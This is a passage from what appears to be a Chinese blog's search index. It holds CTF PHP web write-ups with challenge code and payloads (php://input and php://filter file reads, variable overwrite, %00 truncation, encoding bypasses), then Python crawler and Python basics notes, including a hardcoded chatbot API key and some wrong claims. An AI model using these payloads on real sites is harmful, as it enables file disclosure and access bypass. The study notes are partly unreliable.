\"flag:nctf{*}\";\n}else{\necho \"the pass is wrong!\";\n}\n}else{\necho \"please input pass!\";\n}\n?>\n```\npayload:pass[]=1\n\n#### 2.php://输入输出流  \n输入输出流主要包括三种：\nphp://input:直接读取post上没有经过解析的原始数据  \n\nphp://output：将post流数据输出  \n\nphp://filter：（常用在XXE漏洞中）文件操作协议，对磁盘文件进行读写，类似于readflie()、file()、flie_get_conments()  \n\n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fqa9q57w77j30ra08n3z7.jpg)\n```\n$file = $_GET['file'];\nif(@file_get_contents($file) == \"meizijiu\"){\n    echo $nctf;\n```\n这道题要的是获取flie传入的文件，提取内容与meizijiu进行比较，我们可以利用php://input\n![image](http://wx1.sinaimg.cn/mw690/0060lm7Tly1fqa9y2go87j309s05o0sp.jpg)  \n#### 3.进制转换绕过\n```\n<?php\nfunction noother_says_correct($number)\n{\n       $one = ord('1');\n       $nine = ord('9');\n       for ($i = 0; $i < strlen($number); $i++)\n       {   \n               $digit = ord($number{$i});\n               if ( ($digit >= $one) && ($digit <= $nine) )\n               {\n                       return false;\n               }\n       }\n          return $number == '54975581388';\n}\n$flag='*******';\nif(noother_says_correct($_GET['key']))\n   echo $flag;\nelse \n   echo 'access denied';\n?>\n```\n这段代码要的是get参数key的值与54975581388相等，但是每一位字符串的assic码要在0到9之外，这里我们可以将54975581388十六进制转码成0xccccccccc绕过\n\n又一道题  \n源码\n\n```\nyou are not the number of bugku !   \n  \n<!--  \n$user = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$pass = $_GET[\"password\"];  \n  \nif(isset($user)&&(file_get_contents($user,'r')===\"welcome to the bugkuctf\")){  \n    echo \"hello admin!<br>\";  \n    include($file); //hint.php  \n}else{  \n    echo \"you are not admin ! \";  \n}  \n -->  \n```\n这里要求传入是三个参数txt、file、password\n- txt：txt参数传给了user变量，file_get_contents($user,'r')===\"welcome to the bugkuctf\"，这里我们可以用到php输入流post传值  \n- flie：刚开始我以为因为是include（）函数我直接将file=hint.php就可以得出hint.php的值，这里没有考考虑到hint.php的路径问题，所以我们应该使用php://filter  \n- password：这里没有对passwor进行限制，可以随意处置  \npayload：?txt=php://input&file=php://filter/content.base64-encode/resoursce=hint.php  \npost:welcome to the bugkuctf  \n得到一个base64的代码，解码得到\n\n```\n<?php  \n  \nclass Flag{//flag.php  \n    public $file;  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n\t\t\techo \"<br>\";\n\t\treturn (\"good\");\n        }  \n    }  \n}  \n?>  \n```\n我再次用PHP://filter读取flag.php，它告诉我不能现在就给我flag，后面就搞不懂了\n\n#### 4.超全局变量\n```\n<?php  \n\nerror_reporting(0);\ninclude \"flag1.php\";\nhighlight_file(__file__);\nif(isset($_GET['args'])){ #判断args参数是否存在\n    $args = $_GET['args'];\n    if(!preg_match(\"/^\\w+$/\",$args)){#用正则判断看srgs变量中是否有字母及数字，有函数返回1，否0，所以这里让你只能输入字母和数字\n        die(\"args error!\");\n    }\n    eval(\"var_dump($$args);\");\n}\n?>\n```\n这道题的关键是var_dump函数输出变量的类型和内容，这里就要抠脑壳了，怎么知道flag在哪个变量  \n看书才发现可以使用$GLOBALS超全局数组调用系统中的所有变量和常量以及对象和对象中的属性变量值  \n$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。\nPHP在名为\\$GLOBALS[index]的数组中存储了所有全局变量。变量的名字就是数组的键。  \n这样我们就给变量赋值args=GLOBALS，使变量为存储了所有变量的数字\n\n#### 5.变量覆盖+php输入输出流  \n```\n<?php\n$flag='xxx';\nextract($_GET);#存在变量覆盖漏洞\nif(isset($shiyan))\n{\n$content=trim(file_get_contents($flag));#看到file_get_contents想到PHP://输入输出\nif($shiyan==$content)\n{\necho'flag{xxx}';\n}\nelse\n{\necho'Oh.no';\n}\n}\n?>\n```\n因为这两种漏洞都写了，只是记住了一道题可以运用多种方法混合区解答  \n![image](http://wx1.sinaimg.cn/mw690/0060lm7Tly1fqb9myprf9j309q056jrc.jpg\n)  \nget传参利用了变量覆盖，将shiyan与content都赋值为0从而绕过，但是由于在覆盖变量之后，会给content重新赋值，所以看到了file_get_contents函数，想到了PHP输入流post传参，通过修改flag的值将content值进行修改  \n\n#### 6.URLencode二次编码\n```\n<?php\nif(eregi(\"hackerDJ\",$_GET[id])) {\necho(\"\n\nnot allowed!\n\");\nexit();\n}\n$_GET[id] = urldecode($_GET[id]);\nif($_GET[id] == \"hackerDJ\")\n{\necho \"\n\nAccess granted!\n\";\necho \"\n\nflag\n\";\n}\n```\n首先eregi函数在id参数中查找有没有hackerDJ字符，有则返回0，所以这里我们不能直接赋值hackerDJ，题目提示了二次编码，这里的get传参时已经进行了一次urldecode解码，后面又通过urldecode函数进行了二次解码，所以经过上面这些提示，就是对hackerDJ进行urlencode二次编码，传入参数就是hackerDJ，又到了抠脑壳的时候，为什么hackerDJ用工具编码后还是不变，看了人家的解答后才知道这种纯字符是不能用工具解码的，要对照编码表解码  \n![image](http://wx1.sinaimg.cn/mw690/0060lm7Tly1fqbb0rgphnj30ad0mnwf2.jpg)\n![image](http://wx3.sinaimg.cn/mw690/0060lm7Tly1fqbb1t901dj30h6015glf.jpg)  \n\n#### 7.数组返回NULL绕过or%00截断   \n```\n<?php\n$flag = \"flag\";\n\nif (isset ($_GET['password'])) {\nif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\necho 'You password must be alphanumeric';\nelse if (strpos ($_GET['password'], '--') !== FALSE)\ndie('Flag: ' . $flag);\nelse\necho 'Invalid password';\n}\n?>\n```\nereg函数查找password\n\n#### 8.一道综合题  \nnever never never give up！！！\n这道题点开源码发现提示\n\n```\n<!--1p.html-->\nnever never never give up !!!\n\n```\n于是打开1p.html，但是发现重定向了，于是直接view-source:得到一串base64编码的代码 \n\n```\nJTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==\n```\n解码得  \n\n```\nif(!$_GET['id'])\n{\n\theader('Location: hello.php?id=1');\n\texit();\n}\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.'))\n{\n\techo 'no no no no no no no';\n\treturn ;\n}\n$data = @file_get_contents($a,'r');\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n{\n\trequire(\"f4l2a3g.txt\");\n}\nelse\n{\n\tprint \"never never never give up !!!\";\n}\n\n\n?>\n```\n这里设置了三个get参数id、a、b，分别对应了三种不同的代码绕过机制  \n- id：关于id的值id==0，并不是说是字符零，而是数字0，所以我们只需要给id赋值一个无数字字符串，无数字字符串在比较时会强制类型转换为数字0  \n- a：a必须为“bugku is a nice plateform!”首先一个stripos($a,'.')函数，限制了a不能从外部引用文件，但又出现了file_get_contents，我们想到了input输入流的形式进行post传参\n- b：b的长度通过strlen($b)>5限制为5以内，eregi(\"111\".substr($b,0,1),\"1114\")表示b中必须要有4，但是substr($b,0,1)!=4，所以我们想到了%00截断  \n\n构造payload：?id=@&a=php://input&b=%0044444 ,\npost:bugku is a nice plateform!\n#### 9.正则表达式匹配  \n\n```\n <?php \nhighlight_file('2.php');\n$key='KEY{********************************}';\n$IM= preg_match(\"/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);\nif( $IM ){ \n  die('key is: '.$key);\n}\n?> \n```\n这道题考察的是正则表达式的匹配  \n> /key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i  \n\n首先是一个字符串key，后面.表示匹配除/n之外的所有单字符，\\*表示前面的单字符重复0次或多次，.{4,7}又表示重复除/n以外的单字符4到7次，后面再跟字符串key:，这里\\\\/将/转义，后面（.\\*key）就是单字符+key，[a-z]表示从中选一个字母，[[:punct:]]表示匹配标点符号  \npayload：?id=key.key.....key:/./.keya;\n\n#### 10.INSERT INTO注入  \n\n```\nerror_reporting(0);#没有报错回显\n\nfunction getIp(){#获取真实ip\n$ip = '';\nif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){#先查看X-Forworded-For头是否设置，取其值\n$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}else{\n$ip = $_SERVER['REMOTE_ADDR'];\n}\n$ip_arr = explode(',', $ip);#将ip变量中的字符串以，为间隔打散成数组\nreturn $ip_arr[0];#所以后面构造sql语句时不能出现，\n\n}\n\n$host=\"localhost\";\n$user=\"\";\n$pass=\"\";\n$db=\"\";\n\n$connect = mysql_connect($host, $user, $pass) or die(\"Unable to connect\");#链接数据库\n\nmysql_select_db($db) or die(\"Unable to select database\");#查询数据库\n\n$ip = getIp();\necho 'your ip is :'.$ip;\n$sql=\"insert into client_ip (ip) values ('$ip')\" ;#向client_ip表中插入变量ip的值  \nmysql_query($sql);\n```\n\n\n\n\n","tags":["web"]},{"title":"python爬虫学习1","url":"/2018/03/25/python-爬虫学习/","content":"## 前提\n1. 最先肯定要复习一下正则不定式，当然还可以用XPath语言去替代正则    [教程](http://www.w3school.com.cn/xpath/)\n![image](http://ww2.sinaimg.cn/large/0060lm7Tly1fpp72zcmssj30m71br7wh.jpg)\n\n2. 爬虫调度端：启动爬虫，停止爬虫，监视爬虫运行情况  \nURL管理器：对将要爬取的和已经爬取过的URL进行管理；可取出带爬取的URL，将其传送给“网页下载器”  \n网页下载器：将URL指定的网页下载，存储成一个字符串，在传送给“网页解析器”  \n网页解析器：解析网页可解析出①有价值的数据②另一方面，每个网页都包含有指向其他网页的URL，解析出来后可补充进“URL管理器”  \n![image](http://ww2.sinaimg.cn/large/0060lm7Tly1fpp7cbw9z7j30vx0gkdkr.jpg)\n![image](http://ww1.sinaimg.cn/large/0060lm7Tly1fpp7cs0ajqj30vv0i2gtv.jpg)\n\n\n3. URL管理器的实现方式有三种，一种是python内存中，利用set（）函数储存url  \n 第二种是关联   第三种就是存放在缓存数据库中，如redis（这个不太明白 ）  \n 4. 常见的网页下载器，官方的是urllib2，在py3.x后被改为urllib.request，支持登录网页的cookies处理以及代理处理），使用from urllib import \n## request添加模块\n1. 基本\n```\n# coding:utf8  #当文件中有中文时，需要声明字符集  \nimport urllib2  \nimport cookielib  \n#引用urllib2、cookielib模块\nurl='https://www.zhihu.com'\ncj=cookielib.CookieJar()\n#将查询数据赋值给变量\nopener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))\nurllib2.install_opener(opener)\n#向urllib2模块添加opener\nrequest=urllib2.Request(url)\nrequest.add_header('user-agent','Mozilla/5.0')\nresponse1=urllib2.urlopen(url)\nprint response1.getcode()\nprint cj\nprint response1.read()\n```\n2. 基本的urlopen()函数不支持验证、cookie或其他HTTP高级功能。要支持这些功能，必须使用build_opener()函数来创建自己的自定义Opener对象  \n3. 网页解析器常用beatuifulsoup模块进行解析\n```\n# coding:utf8\nimport urllib2\nfrom bs4 import BeautifulSoup\nurl='https://www.zhihu.com'\nrequest=urllib2.Request(url)\nresponse1=urllib2.urlopen(url)\nsoup=BeautifulSoup(response1.read(),'html.parser',from_encoding=\"utf-8\")\n#第一个参数是解析出网页的代码，第二个是解析方式，第三个是用的字符集\nlinks=soup.find_all('a')\nfor link in links:\n    print link.name,link['href'],link.get_text()\n#遍历网页html代码中的a节点，并输出节点的名字、链接、对应文本\nprint(soup)\n```\n4. 通过一个简单爬虫实例来学习  \n##### 控制器\n```\n#coding:utf-8\nimport url_manager,html_downloader,html_parser,html_outputer\nclass SpiderMain(object):\n    def __init__(self):\n        self.urls=url_manager.UrlManeger()\n        self.downloader=html_downloader.HtmlDownloader()\n        self.parser=html_parser.HtmlParser()\n        self.outputer=html_outputer.HtmlOutputer()\n        #初始化管理器、下载器、解析器、输出器\n    def craw(self,root_url):\n        count=1#记录爬取的次数\n        self.urls.add_new_url(root_url)\n        while self.urls.has_new_url():#如果有新的url\n            try:\n                new_url=self.urls.get_new_url() #放进一个新的url\n                print 'craw %d:%s'%(count,new_url)\n                html_cont=self.downloader.download(new_url)#下载新url对应的页面\n                new_urls,new_data=self.parser.parser(new_url,html_cont)#对新的url进行代码解析，又得到新的url和有效数据\n                self.urls.add_new_urls(new_urls)#将得到的新的url加入到url管理器进行爬取\n                self.outputer.collect_data(new_data)#收集有效的数据\n                if count==1000:#设置查找到1000个url结束爬取\n                    break\n                count=count+1\n            except:\n                print 'craw failed'#标记url爬取失败\n        self.outputer.output_html()#输出为html形式\n\nif __name__==\"__main__\":\n    root_url=\"https://baike.baidu.com/item/Python\"#设置爬虫的入口url\n    obj_spider=SpiderMain()\n    obj_spider.craw(root_url)#启动爬虫\n```\n##### 管理器\n```\n#coding:utf-8\nclass UrlManeger(object):\n    def __init__(self):\n        self.new_urls=set()#将新的url输出为一个集合并且删除重复元素\n        self.old_urls=set()#将新的url输出为一个集合并且删除重复元素\n\n    def add_new_url(self, url):#向管理器中添加一个新的url\n        if url is None: #判断url是否存在\n            return\n        if url not in self.new_urls and url not in self.old_urls: #判断url是否在待爬取或已爬取页面\n            self.new_urls.add(url)#将url添加到未爬取列表\n\n    def add_new_urls(self, new_urls):#向管理器中添加批量url\n        if new_urls is None or len(new_urls) == 0:\n            return\n        for url in new_urls:#从urls中遍历url添加到URL集合中\n            self.add_new_urls(url)\n\n    def has_new_url(self):#验证是否添加新的url\n        return len(self.new_urls) != 0\n\n    def get_new_url(self):#从管理器中拿出一个新的url进行爬取\n        new_url=self.new_urls.pop()#新的url集合中随机取出一个url并且从集合中删去这个url\n        self.old_urls.add(new_url)\n        return new_url\n```\n##### 解析器\n```\nclass HtmlParser(object):\n    def _get_new_urls(self, page_url, soup):\n        new_urls=set()\n        links=soup.find_all('a', href=re.compile(r'/item/'))#正则匹配，查询a标签中href属性\n        for link in links:#遍历links列表（匹配的url片段）\n            new_url=link['herf']#抓取herf属性值（link被储存为字典，用[]取出数据）\n            new_full_url=urlparse.urljoin(page_url,new_url)#将url拼接起来\n            new_urls.add(new_full_url)#将补全的url加入未爬取url名单\n        return new_urls\n\n    def _get_new_data(self, page_url, soup):\n        res_data={}#建立一个res_data字典\n        res_data['url']=page_url#加入url\n        title_node=soup.find('dd', class_=\"lemmaWgt-lemmaTitle-title\").find(\"h1\")#抓取dd标签class属性的hi属性\n        res_data['title']=title_node.get_text()#取得h1标签文本\n        sammary_node=soup.find('div', class_=\"lemma-summary\")\n        res_data['sammary']=sammary_node.get_text()\n        return res_data#输出字典\n\n    def parser(self, new_url, html_cont):\n        if new_url is None or html_cont is None:#判断页面是否存在\n            return\n        soup=BeautifulSoup(html_cont, 'html_parser',from_encoding='utf-8')#以utf-8字符集解析页面html代码\n        new_urls=self._get_new_urls(new_url, soup)\n        new_data=self._get_new_data(new_url, soup)\n        return new_urls, new_data\n```\n##### 下载器\n```\n#coding:utf-8\n#这里只使用了最简单的方法\nimport urllib2#载入urllib2模块\n\nclass HtmlDownloader(object):\n    def download(self, url):\n        if url is None:#验证url是否存在\n            return None\n        response=urllib2.urlopen(url)#下载url\n        if response.getcode() != 200:#判断状态码\n            return None\n        res=response.read()\n        return res#读取网页内容\n```\n\n##### 输出器\n```\n#coding:utf-8\nclass HtmlOutputer(object):\n    def __init__(self):\n        self.datas=[]#设置data为一个列表\n    def collect_data(self,data):\n        if data is None:\n            return\n        self.datas.append(data)\n\n    def output_html(self):\n        fout=open('output.html','w')#写出一个html文件\n        fout.write('<html>')\n        fout.write('<meta charset=\\'utf-8\\'>')\n        fout.write('<body>')\n        fout.write('<table>')\n        for data in self.datas:\n            fout.write('<tr>')\n            fout.write('<td>%s</td>'%data['url'])\n            fout.write('<td>%s</td>'%data['title'].encode('utf-8'))\n            fout.write('<td>%s</td>'%data['sammary'].encode('utf-8'))\n            fout.write('</tr>')\n        fout.write('</table>')\n        fout.write('</body>')\n        fout.write('</html>')\n        fout.close()\n```\n这个爬取百度百科的模块是按照控制器、URL管理器、下载器、解析器、输出器分开编写的  \n5. 最常用的是“.text”和\".content\"，前者输出unicode，后者输出二进制   \n6. 这是PIL模块中resize函数（重新设置图片尺寸）resize((size, size), Image.ANTIALIAS）图片质量的参数\n![image](http://ww1.sinaimg.cn/large/0060lm7Tly1fpp7dtrugdj30mv06jmxb.jpg)\n7. 某些网站如知乎，存在反爬虫机制，如果要成功加载页面需要伪造头文件\n8. 照着网上的教程，熟悉一下itchat模块，做微信头像拼图的代码\n```\n# -*- coding: utf-8 -*\nimport itchat\nimport os\nfrom math import sqrt\nfrom PIL import Image\n\nitchat.auto_login()#微信登录接口\nfor friend in itchat.get_friends(update=True)[0:]:#获取好友列表，并保持更新\n    print friend['NickName'], friend['RemarkName'], friend['Sex'], friend['Province'], friend['Signature']#输出好友的基本信息\n    img = itchat.get_head_img(userName=friend[\"UserName\"])#获取好友头像\n    path=\"C:\\\\Users\\\\14564\\\\Pictures\\\\pachong\\\\\"+friend['NickName']+'('+friend['RemarkName']+').jpg'#保存获取的头像\n    try:\n        with open(path,'wb') as f:\n            f.write(img)\n    except Exception as e:\n        print repr(e)\n\ndef pt():\n    path2=\"C:\\\\Users\\\\14564\\\\Pictures\\\\pachong\\\\\"\n    pList=[]\n    for item in os.listdir(path2):#遍历出单个头像\n        imgPath=os.path.join(path2,item)\n        pList.append(imgPath)#将头像图片保存到字典中\n    total=len(pList)#计算图片个数\n    line=int(sqrt(total))#计算合成图片边长\n    NewImage=Image.new('RGB',(128*line,128*line))#创建一个新的底片存放大小为128px的所有头像\n    x=0\n    y=0\n    for item in pList:\n        try:\n            Img=Image.open(item)\n            Img=Img.resize((128,128),Image.ANTIALIAS)#将头像图片改变大小\n            NewImage.paste(Img,(x*128,y*128))#不断添加头像\n            x+=1\n        except IOError:\n            print \"第%d行，%d列文件读取失败！IOError：%s\"%(y,x,item)\n            x-=1\n        if x==line:#将一行填完后移动到下一行\n            x=0\n            y+=1\n        if (x+line*y)==line*line:#判断\n            break\n    NewImage.save(path2+'final.jpg')#保存为final.jpg\npt()\nitchat.run()\n8.一个关于微信聊天机器人的程序\n# -*- coding: utf-8 -*\nimport itchat, time, re\nfrom itchat.content import *\nimport urllib2, urllib\nimport json\n\n@itchat.msg_register([TEXT])#向注册方法传入msg包含text文本消息内容，这里的@是一个装饰器\ndef text_reply(msg):\n    info=msg['Text'].encode('UTF-8')#将得到的消息存放在info变量中\n    url='http://wwww.tuling123.com/openapi/api'#链接到图灵机器人api\n    data={u\"key\":\"f0fa6a1ec8c542aeaa606a14b2ee8ecd\",\"info\":info}#post传入参数\n    data=urllib.urlencode(data)\n    url2=urllib2.Request(url,data)\n\n    response= urllib2.urlopen(url2)\n    apicontent=response.read()\n    s=json.loads(apicontent,encoding=\"utf-8\")\n    print 's==',s\n    if s['code']==100000:\n        itchat.send(s['text'],msg['FromUserName'])#将从api得到的json文本发送给好友\nitchat.auto_login(hotReload=True)#hotReload表示保持登录状态\nitchat.run(debug=True)\n```\n9. 关于requests模块的一些补充\n常见报错说明\n![image](http://ww1.sinaimg.cn/large/0060lm7Tly1fpp7aspnr9j315x0f6k3u.jpg)\n```\nwith open('小猪图片.jpg','wb') as f:\n    f.write(r.content)\n```\nr.content将返回图像的二进制内容，当我们要保存到本地文件时，写入方式必须为“wb”，否则会报错","tags":["爬虫"]},{"title":"python基础学习","url":"/2018/03/23/python基础学习/","content":"## 函数\n###### 1. \nprint(L[0][0], L[1][1], L[-1][-1], sep='\\n') 像这样在print里面最后加sep='\\n'可以起到换行的作用，而且换行后面有空格\n###### 2. \nlist列表使用[]括起来。其中元素可以删改，tuple元组使用()，其中不可以删改，都可以在其中进行嵌套\n###### 3.\n条件函数if内部代码只需要缩进两行就可以了，不用{}\n###### 4. \n``` \n age = 20\n if age >= 6:\n    print('teenager')\n elif age >= 18:\n    print('adult')\n else:\n    print('kid')\n```\n\n其中最后结果只会显示teenager，if语句执行有个特点，它是从上往下判断，如果在某个判断上是True，把该判断对应的语句执行后，就忽略掉剩下的elif和else\n###### 5.\ninput()函数输入的值作为字符串，不能参加比较，可以用int（）、float（）函数进行转变\n###### 6. \nPython的循环有两种，一种是for...in循环，依次把list或tuple中的每个元素迭代出来  \n```\nnames = ['Michael', 'Bob', 'Tracy']\nfor name in names:\n    print(name)\n```\n   第二种循环是while循环，只要条件满足，就不断循环，条件不满足时退出循环。比如我们要计算100以内所有奇数之和，可以用while循环实现：\n```\nsum = 0\nn = 99\nwhile n > 0:\n    sum = sum + n\n    n = n - 2\nprint(sum)\n```\n###### 7.\npython中的字典dict与js中的json表达方式极为相似，采用键值对形式表达用{}括起每一个key对应一个value，要删除一个key，用pop(key)方法\n###### 8.\nset相对于dict只有key，相当于一个无序无重复数字的集合，&表示并集，|表示合集，\n###### 9.\nreplace()函数只能改变值，不能改变变量，要改变只有重新定义变量\n```\n>>> a = 'abc'\n>>> b = a.replace('a', 'A')\n>>> b\n       'Abc'\n>>> a\n        'abc'\n```\n###### 10.\n在print函数中逗号起分割作用，涉及几个变量时，必须加，分割，不会显示\nabs（）转化绝对值\nstr（）转化字符串\nint（）转化整数\nhex（）转化十六进制\nlen（）返回字符串的字符数\n###### 11.\npass语句可以在定义函数中作为占位符，def定义函数也要用：引起内部函数，结束定义函数用return返回值，import math语句表示导入math包\n\n###### 12.\n自定义函数必选参数在前，默认参数在后，要修改默认参数的值，要把对应变量写出来复制，单写值无法改变变量，定义默认参数要牢记一点：默认参数必须指向不变对象！\n###### 13.\n在函数中我们还可以设置可变参数，可变参数就是传入的参数个数是可变的，只是在参数前面加了一个*号，省去了在执行函数时再写一遍list、tuple，也就是说可变参数就是可以把列表中的元素提取出来作为可变元素。还有就是关键字参数，允许你传入多个值，还可以用关键字参数调用已有的list;；而命名关键字参数则可以限制自定义参数的名称\n```\ndef person(name,age,**kw):\n    print('name:',name,'age:',age,\"other:\",kw)\nperson('jason',19,city='chengdu')\n>>>name: jason age: 19 other: {'city': 'chengdu'}\n\ndef person(name, age, *, city, job):\n    print(name, age, city, job)\nperson('Jack', 24, city='Beijing', job='Engineer')\nJack 24 Beijing Engineer\n```\n便于理解：\n```\ndef f1(a, b, c=0, *args, **kw):\n     print('a =', a, 'b =', b, 'c =', c, 'args =', args, 'kw =', kw) \ndef f2(a, b, c=0, *, d, **kw):\n     print('a =', a, 'b =', b, 'c =', c, 'd =', d, 'kw =', kw)\n>>> f1(1, 2) \n     a = 1 b = 2 c = 0 args = () kw = {}\n >>> f1(1, 2, c=3)\n     a = 1 b = 2 c = 3 args = () kw = {}\n >>> f1(1, 2, 3, 'a', 'b') \n     a = 1 b = 2 c = 3 args = ('a', 'b') kw = {}\n >>> f1(1, 2, 3, 'a', 'b', x=99)\n     a = 1 b = 2 c = 3 args = ('a', 'b') kw = {'x': 99}\n >>> f2(1, 2, d=99, ext=None) \n     a = 1 b = 2 c = 0 d = 99 kw = {'ext': None}\n```\n###### 14.\n加强记忆，python与C语言不一样!   语句结束不加分号，输入用input（）且输入值为字符串，输出用print（），不用提前定义数据类型，Python是弱类型语言进行递归函数时就要防止栈溢出，在计算机中，函数调用是通过栈（stack）这种数据结构实现的，每当进入一个函数调用，栈就会加一层栈帧，每当函数返回，栈就会减一层栈帧。由于栈的大小不是无限的，所以，递归调用的次数过多，会导致栈溢出。\n###### 15.\n关于切片，表达形式L[m，n]，意思是从列表或元组L中提取出第m+1个元素到n-1个元素的切片，如果第一个索引是0，还可以省略为L[：n]，切片也可以取负数，从后面取元素，倒数第一个元素的索引是-1,正着数则是以两个数的间隔做区分，比如0就在第一个元素以前，1在第一第二个元素中间，所以n要减1\n\n```\nL = ['Michael', 'Sarah', 'Tracy', 'Bob', 'Jack']\nprint(L[-3:])\n>>>['Tracy', 'Bob', 'Jack']\n```\n\n###### 16.\n迭代：给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，对于字典的迭代，很可能并没有按照列出的顺序，因为dict的存储不是按照list的方式顺序排列\n```\nfor ch in 'ABC':\n...     print(ch)\n>>>A\n      B\n      C\n```\n###### 17.\n赋值语句：a, b = b, a + b\n相当于：t = (b, a + b) # t是一个tuple\na = t[0]\nb = t[1]\n###### 18.\nmap()函数接收两个参数，一个是函数，一个是Iterable，map将传入的函数依次作用到序列的每个元素，并把结果作为新的Iterator返回\n```\n>>> def f(x):\n...     return x * x\n...\n>>> r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])\n>>> list(r)\n[1, 4, 9, 16, 25, 36, 49, 64, 81]\n```\n###### 19.\n两个import语义有差异\n```\nimport datetime\nprint(datetime.datetime.now())\n```\n是引入整个datetime包\n```\nfrom datetime import datetime\nprint(datetime.now())\n```\n是只引入datetime包里的datetime类\n所以import之后前者是datetime这个包可见 后者是datetime.datetime这个类可见\n###### 20.\nfilter()接收一个函数和一个序列，用于过滤序列\n例如，在一个list中，删掉偶数，只保留奇数，可以这么写：\n```\ndef is_odd(n):\n    return n % 2 == 1\nlist(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))\n# 结果: [1, 5, 9, 15]\n```\n21.sorted()函数对list进行排序\n```\n>>> sorted([36, 5, -12, 9, -21], key=abs)\n[5, 9, -12, -21, 36] \n```\nstr.lower表示忽略大小写，reverse=True表示反向排序\n\n从这几个函数理解高阶函数的意义就是能够利用其他函数对元素进行处理\n###### 22.\n匿名函数lamba，就是只能有一个表达式，不用写return，返回值就是该表达式的结果。用匿名函数有个好处，因为函数没有名字，不必担心函数名冲突。此外，匿名函数也是一个函数对象，也可以把匿名函数赋值给一个变量，再利用变量来调用该函数\n```\n>>> list(map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9]))\n[1, 4, 9, 16, 25, 36, 49, 64, 81]\n```\n###### 23.\npython2.x中print是一个语句，不用加括号，而在3.x中，print变成了一个函数，要加括号，其中的分隔符用sep定义，结束符用end定义，格式符用%定义，后加元组（）\n```\nprint \"%f, % s\" % (3.4, \"Hello World!\")  \n3.400000, Hello World! \n```\n## 模块\n###### 1.\n```\n#!/usr/bin/env python3\n  # -*- coding: utf-8 -*-\n' a test module '\n```\n第1行和第2行是标准注释，第1行注释可以让这个hello.py文件直接在Unix/Linux/Mac上运行，第2行注释表示.py文件本身使用标准UTF-8编码，第3行是一个字符串，表示模块的文档注释，任何模块代码的第一个字符串都被视为模块的文档注释\nimport sys\n导入模块，导入sys模块后，我们就有了变量sys指向该模块，利用sys这个变量，就可以访问sys模块的所有功能，要引用该模块内的函数用sys.函数名（）\n###### 2.\n作用域：在一个模块中，我们可能会定义很多函数和变量，但有的函数和变量我们希望给别人使用，有的函数和变量我们希望仅仅在模块内部使用。在Python中，是通过_前缀来实现的。类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；\n###### 3.\n包：在文件系统中，包就是一个文件夹，模块就是一个.py文件，区分包与普通文件夹在于每一个包下面都有一个—init—.py文件，并且每一层都有，不同的包里面的同名函数用包名.函数名区分\n![image](http://ww4.sinaimg.cn/large/0060lm7Tly1fpmvimueawj30h90cogq3.jpg\n)\n###### 4.\n如果我们只是应用包里的某些函数，可以使用from math import pow, sin, log来导入\n###### 5.\n```\ntry:\n   \t from cStringIO import StringIO\n    except ImportError:\n    \tfrom StringIO import StringIO\n```\n上述代码先尝试从cStringIO导入，如果失败了（比如cStringIO没有被安装），再尝试从StringIO导入。这样，如果cStringIO模块存在，则我们将获得更快的运行速度，如果cStringIO不存在，则顶多代码运行速度会变慢，但不会影响代码的正常执行。try 的作用是捕获错误，并在捕获到指定错误时执行 except 语句。\n###### 6.\n第三方模块载入在py2.7以后已经自带了pip，可以利用piip下载第三方模块，并且IDEpcharm中自带pip。import载入模块时，遇到未下载第三方模块会提醒你下载\n## 面向对象\n###### 